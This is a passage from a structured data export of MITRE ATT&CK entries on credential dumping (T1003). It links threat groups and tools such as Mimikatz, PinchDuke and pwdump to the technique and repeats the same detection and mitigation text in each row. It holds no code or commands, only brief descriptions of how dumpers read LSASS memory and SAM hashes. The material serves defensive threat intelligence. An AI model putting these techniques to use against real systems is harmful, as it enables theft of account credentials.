Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
52,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","[""[[Software/S0048|PinchDuke]] steals credentials from compromised hosts. [[Software/S0048|PinchDuke]]'s credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by [[Software/S0048|PinchDuke]] include ones associated with The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, Internet Explorer, Microsoft Outlook, WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).[[CiteRef::F-Secure The Dukes]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: PinchDuke,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
53,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0050|CosmicDuke]] collects user credentials, including passwords, for various programs and browsers, including popular instant messaging applications, Web browsers, and email clients. Windows account hashes, domain accounts, and LSA secrets are also collected, as are WLAN keys.[[CiteRef::F-Secure The Dukes]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: CosmicDuke, TinyBaron, ...",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
54,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0052|OnionDuke]] steals credentials from its victims.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: OnionDuke,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
55,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Group/G0033|Poseidon Group]] conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.[[CiteRef::Kaspersky Poseidon Group]]']",['Poseidon Group'],['Poseidon Group'],['G0033'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
56,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Group/G0022|APT3]] has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument ""dig."" The group has also used a tools to dump passwords from browsers.[[CiteRef::Symantec Buckeye]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
57,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0144|ChChes]] steals credentials stored inside Internet Explorer.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: ChChes, Scorpion, HAYMAKER",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
58,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
59,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0006|pwdump]] can be used to dump credentials.[[CiteRef::Wikipedia pwdump]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: pwdump,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
60,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0045|menuPass]] has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::Github AD-Pentest-Script]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
61,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0021|Molerats]] used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows 